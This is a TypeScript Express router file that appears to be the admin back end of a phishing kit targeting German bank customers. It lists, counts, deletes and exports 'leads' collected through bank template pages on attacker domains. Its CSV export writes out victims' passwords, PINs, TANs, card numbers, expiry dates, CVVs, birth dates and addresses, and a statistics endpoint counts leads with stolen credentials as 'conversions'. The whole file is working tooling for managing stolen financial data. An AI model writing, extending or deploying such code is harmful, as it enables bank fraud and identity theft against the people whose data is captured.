import express from 'express';
import { getDb } from '../database';
import { authenticateJWT, requireAdmin } from '../middleware';

const router = express.Router();

// Get all leads with filtering, pagination, and statistics
router.get('/', authenticateJWT, async (req, res) => {
  const { 
    page = 1, 
    limit = 50, 
    template_name, 
    domain_id, 
    status, 
    search, 
    date_range = 'all',
    sort_by = 'created_at',
    sort_order = 'desc'
  } = req.query;

  try {
    const db = getDb();
    
    // Build the base query - ensure we get ALL leads
    let query = `
      SELECT 
        l.*,
        COALESCE(t.name, 'Unknown Template') as template_display_name,
        COALESCE(t.folder_name, 'unknown') as template_name,
        COALESCE(d.domain_name, 'Unknown Domain') as domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
    `;
    
    const queryParams: any[] = [];
    
    // Apply filters
    if (template_name) {
      query += ' AND t.folder_name = ?';
      queryParams.push(template_name);
    }
    
    if (domain_id) {
      query += ' AND l.domain_id = ?';
      queryParams.push(domain_id);
    }
    
    if (status) {
      query += ' AND l.status = ?';
      queryParams.push(status);
    }
    
    if (search) {
      query += ' AND (l.name LIKE ? OR l.email LIKE ? OR l.username LIKE ? OR l.phone LIKE ?)';
      const searchPattern = `%${search}%`;
      queryParams.push(searchPattern, searchPattern, searchPattern, searchPattern);
    }
    
    // Date range filtering
    if (date_range && date_range !== 'all') {
      const now = new Date();
      let startDate: Date;
      
      switch (date_range) {
        case 'today':
          startDate = new Date(now.getFullYear(), now.getMonth(), now.getDate());
          break;
        case 'week':
          startDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
          break;
        case 'month':
          startDate = new Date(now.getFullYear(), now.getMonth(), 1);
          break;
        case 'quarter':
          const quarter = Math.floor(now.getMonth() / 3);
          startDate = new Date(now.getFullYear(), quarter * 3, 1);
          break;
        default:
          startDate = new Date(0);
      }
      
      query += ' AND l.created_at >= ?';
      queryParams.push(startDate.toISOString());
    }
    
    // Get total count for pagination (before applying LIMIT)
    const countQuery = query.replace(/SELECT[\s\S]*?FROM leads l/, 'SELECT COUNT(*) as total FROM leads l');
    const totalResult = db.prepare(countQuery).get(...queryParams) as { total: number };
    const total = totalResult.total;
    
    // Debug: Compare with raw lead count
    if (process.env.NODE_ENV === 'development') {
      const rawCount = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
      console.log(`🔍 [COUNT DEBUG] Raw leads: ${rawCount.count}, Filtered leads: ${total}`);
      if (rawCount.count !== total) {
        console.log(`⚠️ [COUNT MISMATCH] ${rawCount.count - total} leads are being filtered out by the query!`);
      }
    }
    
    // Add sorting and pagination
    const validSortColumns = ['created_at', 'name', 'email', 'status', 'template_name'];
    const sortColumn = validSortColumns.includes(sort_by as string) ? sort_by : 'created_at';
    const sortDirection = sort_order === 'asc' ? 'ASC' : 'DESC';
    
    query += ` ORDER BY ${sortColumn} ${sortDirection}`;
    
    // Add pagination
    const limitNum = Math.min(parseInt(limit as string) || 50, 100); // Max 100 per page
    const offsetNum = (parseInt(page as string) - 1) * limitNum;
    
    query += ' LIMIT ? OFFSET ?';
    queryParams.push(limitNum, offsetNum);
    
    const leads = db.prepare(query).all(...queryParams);
    
    // Debug logging for missing entries
    if (process.env.NODE_ENV === 'development') {
      console.log(`🔍 [LEADS DEBUG] Query executed:`);
      console.log(`   Total found: ${total}`);
      console.log(`   Page: ${page}, Limit: ${limitNum}, Offset: ${offsetNum}`);
      console.log(`   Filters: template=${template_name}, status=${status}, search=${search}, date_range=${date_range}`);
      console.log(`   Results returned: ${leads.length}`);
      if (leads.length > 0) {
        console.log(`   Date range in results: ${leads[leads.length - 1]?.created_at} to ${leads[0]?.created_at}`);
      }
    }
    
    // Calculate pagination info
    const totalPages = Math.ceil(total / limitNum);
    const hasMore = parseInt(page as string) < totalPages;
    
    return res.json({
      leads,
      pagination: {
        page: parseInt(page as string),
        limit: limitNum,
        total: total,
        totalPages: totalPages,
        hasMore: hasMore
      }
    });
  } catch (error) {
    console.error('Error fetching leads:', error);
    return res.status(500).json({ message: 'Server error fetching leads' });
  }
});

// Get a specific lead by ID
router.get('/:id', authenticateJWT, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    const lead = db.prepare(`
      SELECT l.*, t.name as template_display_name, t.folder_name as template_name, d.domain_name
      FROM leads l
      JOIN templates t ON l.template_id = t.id
      JOIN domains d ON l.domain_id = d.id
      WHERE l.id = ?
    `).get(id);
    
    if (!lead) {
      return res.status(404).json({ message: 'Lead not found' });
    }
    
    return res.json({ lead });
  } catch (error) {
    console.error(`Error fetching lead ${id}:`, error);
    return res.status(500).json({ message: 'Server error fetching lead' });
  }
});

// Update lead status
router.put('/:id/status', requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { status } = req.body;
  
  const validStatuses = ['new', 'contacted', 'completed', 'cancelled'];
  if (!validStatuses.includes(status)) {
    return res.status(400).json({ message: 'Invalid status' });
  }
  
  try {
    const db = getDb();
    const result = db.prepare('UPDATE leads SET status = ? WHERE id = ?').run(status, id);
    
    if (result.changes === 0) {
      return res.status(404).json({ message: 'Lead not found' });
    }
    
    return res.json({ message: 'Lead status updated successfully' });
  } catch (error) {
    console.error(`Error updating lead ${id}:`, error);
    return res.status(500).json({ message: 'Server error updating lead' });
  }
});

// Delete a lead
router.delete('/:id', requireAdmin, async (req, res) => {
  const { id } = req.params;
  
  try {
    const db = getDb();
    const result = db.prepare('DELETE FROM leads WHERE id = ?').run(id);
    
    if (result.changes === 0) {
      return res.status(404).json({ message: 'Lead not found' });
    }
    
    return res.json({ message: 'Lead deleted successfully' });
  } catch (error) {
    console.error(`Error deleting lead ${id}:`, error);
    return res.status(500).json({ message: 'Server error deleting lead' });
  }
});

// Export leads to CSV (admin only) - WITH ALL SENSITIVE DATA
router.get('/export/csv', requireAdmin, async (req, res) => {
  const { template_id, domain_id, status, from_date, to_date, include_sensitive = 'true' } = req.query;
  
  try {
    let query = `
      SELECT 
        l.*,
        COALESCE(t.name, 'Unknown Template') as template_display_name,
        COALESCE(t.folder_name, 'unknown') as template_name,
        COALESCE(d.domain_name, 'Unknown Domain') as domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
    `;
    
    const queryParams: any[] = [];
    
    if (template_id) {
      query += ' AND l.template_id = ?';
      queryParams.push(template_id);
    }
    
    if (domain_id) {
      query += ' AND l.domain_id = ?';
      queryParams.push(domain_id);
    }
    
    if (status) {
      query += ' AND l.status = ?';
      queryParams.push(status);
    }
    
    if (from_date) {
      query += ' AND l.created_at >= ?';
      queryParams.push(from_date);
    }
    
    if (to_date) {
      query += ' AND l.created_at <= ?';
      queryParams.push(to_date);
    }
    
    query += ' ORDER BY l.created_at DESC';
    
    const db = getDb();
    const leads = db.prepare(query).all(...queryParams);
    
    // Generate CSV with ALL data including sensitive information
    const csvHeaders = [
      'ID',
      'Erstellt am',
      'Bank Template',
      'Domain',
      'Status',
      'Name',
      'E-Mail',
      'Telefon',
      'Benutzername',
      'Passwort',
      'PIN',
      'TAN',
      'IP Adresse',
      'Browser',
      'Vorname',
      'Nachname',
      'Geburtsdatum',
      'Straße',
      'Hausnummer',
      'PLZ',
      'Stadt',
      'Kartennummer',
      'Ablaufdatum',
      'CVV',
      'Karteninhaber',
      'Bank Type',
      'Selected Branch',
      'Session Key',
      'Referrer',
      'Additional Data (JSON)'
    ];
    
    // Helper function to safely extract data from JSON
    const extractFromAdditionalData = (additionalDataStr: string | null, path: string) => {
      if (!additionalDataStr) return '';
      try {
        const data = JSON.parse(additionalDataStr);
        const keys = path.split('.');
        let value = data;
        for (const key of keys) {
          value = value?.[key];
        }
        return value || '';
      } catch {
        return '';
      }
    };
    
    // Generate CSV rows with ALL data
    const csvRows = leads.map((lead: any) => {
      const additionalData = lead.additional_data;
      let parsedAdditionalData: any = {};
      try {
        parsedAdditionalData = JSON.parse(additionalData || '{}');
      } catch {
        parsedAdditionalData = {};
      }
      
      return [
        lead.id,
        new Date(lead.created_at).toLocaleString('de-DE'),
        lead.template_display_name,
        lead.domain_name,
        lead.status,
        lead.name || '',
        lead.email || '',
        lead.phone || '',
        lead.username || '',
        lead.password || extractFromAdditionalData(additionalData, 'password') || parsedAdditionalData.password || '',
        lead.pin || extractFromAdditionalData(additionalData, 'pin') || parsedAdditionalData.pin || '',
        lead.tan || extractFromAdditionalData(additionalData, 'tan') || parsedAdditionalData.tan || '',
        lead.ip_address || '',
        lead.user_agent || '',
        extractFromAdditionalData(additionalData, 'first_name') || parsedAdditionalData.first_name || '',
        extractFromAdditionalData(additionalData, 'last_name') || parsedAdditionalData.last_name || '',
        extractFromAdditionalData(additionalData, 'date_of_birth') || parsedAdditionalData.date_of_birth || '',
        extractFromAdditionalData(additionalData, 'street') || parsedAdditionalData.street || '',
        extractFromAdditionalData(additionalData, 'street_number') || parsedAdditionalData.street_number || '',
        extractFromAdditionalData(additionalData, 'plz') || parsedAdditionalData.plz || '',
        extractFromAdditionalData(additionalData, 'city') || parsedAdditionalData.city || '',
        extractFromAdditionalData(additionalData, 'card_number') || parsedAdditionalData.card_number || '',
        extractFromAdditionalData(additionalData, 'expiry_date') || parsedAdditionalData.expiry_date || '',
        extractFromAdditionalData(additionalData, 'cvv') || parsedAdditionalData.cvv || '',
        extractFromAdditionalData(additionalData, 'cardholder_name') || parsedAdditionalData.cardholder_name || '',
        extractFromAdditionalData(additionalData, 'bank_type') || parsedAdditionalData.bank_type || '',
        extractFromAdditionalData(additionalData, 'selected_branch') || parsedAdditionalData.selected_branch || '',
        extractFromAdditionalData(additionalData, 'session_key') || lead.tracking_id || '',
        extractFromAdditionalData(additionalData, 'referrer') || '',
        additionalData || '' // Include full additional data as last column
      ].map(field => {
        // Escape CSV values and handle German characters
        const value = String(field || '');
        if (value.includes(',') || value.includes('"') || value.includes('\n')) {
          return `"${value.replace(/"/g, '""')}"`;
        }
        return value;
      });
    });
    
    // Combine headers and rows
    const csv = [
      csvHeaders.join(','),
      ...csvRows.map(row => row.join(','))
    ].join('\n');
    
    // Set proper headers for CSV download with UTF-8 BOM for Excel compatibility
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="banking-suite-logs-complete.csv"');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Pragma', 'no-cache');
    
    // Add UTF-8 BOM for proper Excel encoding
    const utf8BOM = '\uFEFF';
    res.send(utf8BOM + csv);
    
    console.log(`📊 Complete CSV export generated with ${leads.length} records (ALL sensitive data included)`);
  } catch (error) {
    console.error('Error exporting leads:', error);
    return res.status(500).json({ message: 'Server error exporting leads' });
  }
});

// Get comprehensive lead statistics (for Leads page)
router.get('/statistics', authenticateJWT, async (req, res) => {
  try {
    const db = getDb();
    
    // Get total counts by status (including partial leads)
    const totalLeads = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
    const completedLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE status = "completed"').get() as { count: number };
    const newLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE status = "new"').get() as { count: number };
    const contactedLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE status = "contacted"').get() as { count: number };
    const partialLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE status LIKE "partial%"').get() as { count: number };
    const cancelledLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE status = "cancelled"').get() as { count: number };
    
    // Data quality stats
    const leadsWithEmail = db.prepare('SELECT COUNT(*) as count FROM leads WHERE email IS NOT NULL AND email != ""').get() as { count: number };
    const leadsWithPhone = db.prepare('SELECT COUNT(*) as count FROM leads WHERE phone IS NOT NULL AND phone != ""').get() as { count: number };
    const leadsWithCredentials = db.prepare('SELECT COUNT(*) as count FROM leads WHERE username IS NOT NULL AND username != "" AND password IS NOT NULL AND password != ""').get() as { count: number };
    
    // Recent activity (last 24 hours)
    const recentLeads = db.prepare('SELECT COUNT(*) as count FROM leads WHERE created_at > datetime("now", "-1 day")').get() as { count: number };
    
    // Conversion rate (completed / total)
    const conversionRate = totalLeads.count > 0 ? ((completedLeads.count / totalLeads.count) * 100) : 0;
    
    // Breakdown by template
    const templateBreakdown = db.prepare(`
      SELECT 
        t.name as template_name,
        t.folder_name,
        COUNT(l.id) as total_leads,
        SUM(CASE WHEN l.status = 'completed' THEN 1 ELSE 0 END) as completed_leads,
        SUM(CASE WHEN l.status = 'new' THEN 1 ELSE 0 END) as new_leads,
        SUM(CASE WHEN l.status = 'contacted' THEN 1 ELSE 0 END) as contacted_leads,
        SUM(CASE WHEN l.status LIKE 'partial%' THEN 1 ELSE 0 END) as partial_leads
      FROM templates t
      LEFT JOIN leads l ON l.template_id = t.id
      WHERE t.is_active = 1
      GROUP BY t.id
      ORDER BY total_leads DESC
    `).all();
    
    res.json({
      statistics: {
        total: totalLeads.count,
        completed: completedLeads.count,
        new: newLeads.count,
        contacted: contactedLeads.count,
        partial: partialLeads.count,
        cancelled: cancelledLeads.count,
        withEmail: leadsWithEmail.count,
        withPhone: leadsWithPhone.count,
        withCredentials: leadsWithCredentials.count,
        recent24h: recentLeads.count,
        conversionRate: parseFloat(conversionRate.toFixed(2)),
        templateBreakdown
      }
    });
  } catch (error) {
    console.error('Error fetching lead statistics:', error);
    res.status(500).json({ error: 'Failed to fetch lead statistics' });
  }
});

// Debug endpoint to check specific date range (admin only)
router.get('/debug/date/:date', requireAdmin, async (req, res) => {
  try {
    const { date } = req.params;
    const db = getDb();
    
    // Parse the date (format: YYYY-MM-DD or DD.MM.YYYY)
    let searchDate: string;
    if (date.includes('.')) {
      // Convert DD.MM.YYYY to YYYY-MM-DD
      const [day, month, year] = date.split('.');
      searchDate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
    } else {
      searchDate = date;
    }
    
    // Get leads for specific date
    const leadsOnDate = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.name,
        l.username,
        l.email,
        l.status,
        t.name as template_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE DATE(l.created_at) = ?
      ORDER BY l.created_at DESC
    `).all(searchDate);
    
    // Get leads around that date (±2 days)
    const leadsAroundDate = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.name,
        l.username,
        l.email,
        l.status,
        t.name as template_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE l.created_at >= DATE(?, '-2 days') 
      AND l.created_at <= DATE(?, '+2 days')
      ORDER BY l.created_at DESC
    `).all(searchDate, searchDate);
    
    res.json({
      searchDate,
      originalDate: date,
      leadsOnDate,
      leadsAroundDate,
      totalOnDate: leadsOnDate.length,
      totalAroundDate: leadsAroundDate.length
    });
  } catch (error) {
    console.error('Error in date debug:', error);
    res.status(500).json({ error: 'Debug endpoint error' });
  }
});

// Debug endpoint to check count discrepancies (admin only)
router.get('/debug/count-check', requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    
    // 1. Raw lead count (what dashboard uses)
    const rawCount = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
    
    // 2. Count with LEFT JOIN (what Protokolle page uses)
    const joinCount = db.prepare(`
      SELECT COUNT(*) as total FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
    `).get() as { total: number };
    
    // 3. Count with INNER JOIN (old method)
    const innerJoinCount = db.prepare(`
      SELECT COUNT(*) as total FROM leads l
      JOIN templates t ON l.template_id = t.id
      JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
    `).get() as { total: number };
    
    // 4. Check for orphaned leads
    const orphanedTemplateLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads l
      WHERE l.template_id NOT IN (SELECT id FROM templates WHERE id IS NOT NULL)
    `).get() as { count: number };
    
    const orphanedDomainLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads l
      WHERE l.domain_id NOT IN (SELECT id FROM domains WHERE id IS NOT NULL)
    `).get() as { count: number };
    
    // 5. Sample of first 25 leads with current query
    const sampleLeads = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.template_id,
        l.domain_id,
        l.name,
        l.username,
        l.status,
        COALESCE(t.name, 'Unknown Template') as template_display_name,
        COALESCE(t.folder_name, 'unknown') as template_name,
        COALESCE(d.domain_name, 'Unknown Domain') as domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
      ORDER BY created_at DESC
      LIMIT 25
    `).all();
    
    res.json({
      counts: {
        rawLeads: rawCount.count,
        leftJoinLeads: joinCount.total,
        innerJoinLeads: innerJoinCount.total,
        orphanedTemplateLeads: orphanedTemplateLeads.count,
        orphanedDomainLeads: orphanedDomainLeads.count
      },
      sampleLeads: {
        count: sampleLeads.length,
        dateRange: sampleLeads.length > 0 ? {
          earliest: sampleLeads[sampleLeads.length - 1]?.created_at,
          latest: sampleLeads[0]?.created_at
        } : null,
        leads: sampleLeads.map((lead: any) => ({
          id: lead.id,
          created_at: lead.created_at,
          name: lead.name || lead.username,
          template: lead.template_name,
          domain: lead.domain_name,
          status: lead.status
        }))
      },
      analysis: {
        expectedCount: rawCount.count,
        actualCount: joinCount.total,
        missing: rawCount.count - joinCount.total,
        isCountCorrect: rawCount.count === joinCount.total
      }
    });
  } catch (error) {
    console.error('Error in count check debug:', error);
    res.status(500).json({ error: 'Debug endpoint error' });
  }
});

// Debug endpoint to check for missing 02.11.2025 logs (admin only)
router.get('/debug/missing-02-11', requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    
    // Check for logs on 02.11.2025 specifically
    const logsOn0211 = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.name,
        l.username,
        l.email,
        l.status,
        t.name as template_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE DATE(l.created_at) = '2025-11-02'
      ORDER BY l.created_at DESC
    `).all();
    
    // Check for logs on 03.11.2025
    const logsOn0311 = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.name,
        l.username,
        l.email,
        l.status,
        t.name as template_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE DATE(l.created_at) = '2025-11-03'
      ORDER BY l.created_at DESC
    `).all();
    
    // Check total count and pagination
    const totalLeads = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
    const totalWithJoin = db.prepare(`
      SELECT COUNT(*) as count FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
    `).get() as { count: number };
    
    // Check what would be returned by the normal API call (first page, 25 items)
    const normalApiQuery = `
      SELECT l.*, t.name as template_display_name, t.folder_name as template_name, d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE 1=1
      ORDER BY created_at DESC
      LIMIT 25 OFFSET 0
    `;
    const normalApiResults = db.prepare(normalApiQuery).all();
    
    res.json({
      logsOn0211: {
        count: logsOn0211.length,
        logs: logsOn0211
      },
      logsOn0311: {
        count: logsOn0311.length,
        logs: logsOn0311
      },
      totalCounts: {
        totalLeads: totalLeads.count,
        totalWithJoin: totalWithJoin.count
      },
      normalApiResults: {
        count: normalApiResults.length,
        dateRange: normalApiResults.length > 0 ? {
          earliest: normalApiResults[normalApiResults.length - 1]?.created_at,
          latest: normalApiResults[0]?.created_at
        } : null,
        containsNov02: normalApiResults.some((lead: any) => lead.created_at?.includes('2025-11-02')),
        containsNov03: normalApiResults.some((lead: any) => lead.created_at?.includes('2025-11-03'))
      }
    });
  } catch (error) {
    console.error('Error in missing 02-11 debug:', error);
    res.status(500).json({ error: 'Debug endpoint error' });
  }
});

// Debug endpoint to check recent leads by date (admin only)
router.get('/debug/recent', requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    
    // Get all leads from the last 7 days with full details
    const recentLeads = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        DATE(l.created_at) as date_only,
        TIME(l.created_at) as time_only,
        l.name,
        l.username,
        l.email,
        l.status,
        l.template_id,
        l.domain_id,
        t.name as template_name,
        t.folder_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      WHERE l.created_at >= DATE('now', '-7 days')
      ORDER BY l.created_at DESC
    `).all();
    
    // Group by date
    const leadsByDate = recentLeads.reduce((acc: any, lead: any) => {
      const date = lead.date_only;
      if (!acc[date]) {
        acc[date] = [];
      }
      acc[date].push(lead);
      return acc;
    }, {});
    
    // Get count by date
    const countByDate = db.prepare(`
      SELECT 
        DATE(created_at) as date,
        COUNT(*) as count
      FROM leads
      WHERE created_at >= DATE('now', '-7 days')
      GROUP BY DATE(created_at)
      ORDER BY date DESC
    `).all();
    
    res.json({
      totalRecent: recentLeads.length,
      leadsByDate,
      countByDate,
      dateRange: '7 days',
      query: 'Recent leads debug'
    });
  } catch (error) {
    console.error('Error in recent debug:', error);
    res.status(500).json({ error: 'Debug endpoint error' });
  }
});

// Debug endpoint to show ALL leads without filtering (admin only)
router.get('/debug/all', requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    
    // Get ALL leads with template and domain info
    const allLeads = db.prepare(`
      SELECT 
        l.id,
        l.template_id,
        l.domain_id,
        l.status,
        l.created_at,
        l.name,
        l.email,
        l.username,
        t.name as template_name,
        t.folder_name,
        d.domain_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      LEFT JOIN domains d ON l.domain_id = d.id
      ORDER BY l.created_at DESC
    `).all();
    
    // Get leads that would be excluded by the normal JOIN
    const excludedLeads = db.prepare(`
      SELECT 
        l.id,
        l.template_id,
        l.domain_id,
        l.status,
        l.created_at,
        l.name,
        l.email,
        l.username
      FROM leads l
      WHERE l.template_id NOT IN (SELECT id FROM templates WHERE templates.id IS NOT NULL)
      OR l.domain_id NOT IN (SELECT id FROM domains WHERE domains.id IS NOT NULL)
      ORDER BY l.created_at DESC
    `).all();
    
    // Count by template (direct method)
    const templateCountsDirect = db.prepare(`
      SELECT 
        template_id,
        COUNT(*) as count
      FROM leads
      GROUP BY template_id
      ORDER BY count DESC
    `).all();
    
    // Count by template (JOIN method - what Protokolle uses)
    const templateCountsJoin = db.prepare(`
      SELECT 
        t.id as template_id,
        t.name as template_name,
        t.folder_name,
        COUNT(l.id) as count
      FROM templates t
      LEFT JOIN leads l ON l.template_id = t.id
      GROUP BY t.id
      ORDER BY count DESC
    `).all();
    
    // Calculate totals for response
    const totalRaw = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
    
    res.json({
      debug: {
        totalLeadsRaw: totalRaw.count,
        totalLeadsWithJoin: allLeads.length,
        excludedLeads: excludedLeads.length,
        allLeads: allLeads.slice(0, 50), // First 50 for inspection
        excludedLeadsDetails: excludedLeads,
        templateCountsDirect,
        templateCountsJoin,
        discrepancy: {
          raw_vs_join: totalRaw.count - allLeads.length,
          excluded_count: excludedLeads.length
        }
      }
    });
  } catch (error) {
    console.error('Error in debug endpoint:', error);
    res.status(500).json({ error: 'Failed to fetch debug data' });
  }
});

export default router;
